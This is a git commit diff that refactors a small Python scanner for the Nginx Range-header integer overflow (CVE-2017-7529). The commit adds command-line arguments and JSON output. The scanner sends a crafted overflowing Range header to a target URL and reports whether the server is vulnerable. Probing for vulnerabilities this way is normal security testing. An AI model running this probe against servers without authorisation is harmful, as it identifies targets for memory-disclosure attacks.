4cd62ef80f634f2842d8152130d0a734abfd471f
Evil2997 <dima.molchanow2012@gmail.com>
2024-04-29 16:41:39 +0300

    Add arguments, output json, add error if have empty result absolute path. Change output. Add .gitignore, requirements.txt.

--- scanner.py
+++ scanner.py
@@ -1,5 +1,9 @@
 #!/usr/bin/python
 # -*- coding:utf-8 -*-
+import argparse
+import json
+import pathlib
+from typing import Final
 
 # Nginx - Remote Integer Overflow Vulnerability
 # CVE-2017-7529
@@ -7,40 +11,62 @@
 # Instagram: @itninja.official
 
 import requests
-import sys
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from urllib3 import disable_warnings
+from urllib3.exceptions import InsecureRequestWarning
+
+disable_warnings(InsecureRequestWarning)
 
 
 def send_http_request(url, headers={}, timeout=8.0):
-    httpResponse   = requests.get(url, headers=headers, timeout=timeout, verify=False)
-    httpHeaders    = httpResponse.headers
+    httpResponse = requests.get(url, headers=headers, timeout=timeout, verify=False)
+    httpHeaders = httpResponse.headers
 
-#     print("Server: %s".format(httpHeaders.get('Server', '')))
-    print(httpHeaders.get('Server', ''))
+    # print(httpHeaders.get('Server', ''))
+    data["Server"] = httpHeaders.get('Server', '')
     return httpResponse
 
 
 def exploit(url):
-    httpResponse   = send_http_request(url)
+    httpResponse = send_http_request(url)
 
     content_length = httpResponse.headers.get('Content-Length', 0)
-    bytes_length   = int(content_length) + 623
+    bytes_length = int(content_length) + 623
     content_length = "bytes=-%d,-9223372036854%d" % (bytes_length, 776000 - bytes_length)
 
-    httpResponse   = send_http_request(url, headers={ 'Range': content_length })
+    httpResponse = send_http_request(url, headers={'Range': content_length})
+
     if httpResponse.status_code == 206 and "Content-Range" in httpResponse.text:
-        print("Vulnerable to CVE-2017-7529")
+        data["Is_Vulnerable"] = "CVE-2017-7529"
+        # print("Vulnerable to CVE-2017-7529")
     else:
-        print("No Vulnerable")
+        data["Is_Vulnerable"] = "No Vulnerable"
+        # print("No Vulnerable")
+
+    return data
 
 
 if __name__ == '__main__':
-    if len(sys.argv) != 2:
-        print("[usage] %s <url>" % sys.argv[0])
-        sys.exit(1)
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--target', type=str, help='Your target url/domain/ip')
+    parser.add_argument('--output', type=str, help='filename JSON')
 
-    url = sys.argv[1]
-    exploit(url)
+    args = parser.parse_args()
 
+    target = args.target
+    output = args.output
 
+    MAIN_DIR: Final[pathlib.Path] = pathlib.Path(__file__).parent
+    OUTPUT_FILE: str = MAIN_DIR / output
+
+    data = {}
+    try:
+        data = exploit(target)
+    except Exception as e:
+        pass
+    if data == {}:
+        data = {
+            "Error": "Nothing found in Scanginx"
+        }
+    with open(OUTPUT_FILE, 'w') as jf:
+        json.dump(data, jf, indent=2)
+    print("----OUTPUT----\n", data)
